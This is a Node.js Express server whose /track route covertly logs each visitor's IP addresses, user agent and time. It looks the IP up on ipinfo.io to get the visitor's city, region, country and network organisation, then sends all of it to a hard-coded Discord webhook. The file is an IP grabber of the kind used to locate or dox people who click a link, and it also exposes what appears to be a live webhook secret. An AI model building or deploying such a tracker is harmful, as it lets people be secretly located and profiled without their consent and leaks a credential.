import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL =
    process.env.WEBHOOK_URL || "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";

app.set("trust proxy", true);

// Home
app.get("/", (req, res) => {
    res.sendFile("index.html", { root: process.cwd() });
});

// Track route
app.get("/track", async (req, res) => {

    // =========================
    // IP HANDLING
    // =========================

    const forwardedIp =
        req.headers["x-forwarded-for"] || "None";

    const socketIp =
        req.socket.remoteAddress || "None";

    let ip =
        req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
        req.socket.remoteAddress ||
        "Unknown";

    // Clean IPv4-mapped IPv6
    ip = ip.replace(/^::ffff:/, "");

    const userAgent =
        req.headers["user-agent"] || "Unknown";

    // =========================
    // TIME (PH)
    // =========================

    const timestamp = new Date().toLocaleString("en-PH", {
        timeZone: "Asia/Manila",
        year: "numeric",
        month: "long",
        day: "numeric",
        hour: "numeric",
        minute: "2-digit",
        second: "2-digit",
        hour12: true
    });

    // =========================
    // IPINFO LOOKUP
    // =========================

    let city = "Unknown";
    let region = "Unknown";
    let country = "Unknown";
    let org = "Unknown";
    let ipType = "Unknown";

    try {
        const geoRes = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await geoRes.json();

        console.log("IPInfo Response:", data);

        city = data.city || "Unknown";
        region = data.region || "Unknown";
        country = data.country || "Unknown";
        org = data.org || "Unknown";
        ipType = data.ip?.includes(":") ? "IPv6" : "IPv4";

    } catch (err) {
        console.error("IPInfo lookup failed:", err);
    }

    // =========================
    // DEBUG LOGS
    // =========================

    console.log("Chosen IP:", ip);
    console.log("Forwarded IP:", forwardedIp);
    console.log("Socket IP:", socketIp);

    // =========================
    // DISCORD MESSAGE
    // =========================

    const message = `
🇵🇭 New Visitor Logged

🕒 Time: ${timestamp}

🌍 IP: ${ip}
📦 Forwarded IP: ${forwardedIp}
🧠 Socket IP: ${socketIp}

📶 Type: ${ipType}

📍 Location: ${city}, ${region}, ${country}
🏢 Org: ${org}

🖥️ Device: ${userAgent}
`;

    // =========================
    // SEND TO DISCORD
    // =========================

    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: message
            })
        });
    } catch (err) {
        console.error("Webhook failed:", err);
    }

    res.sendStatus(200);
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
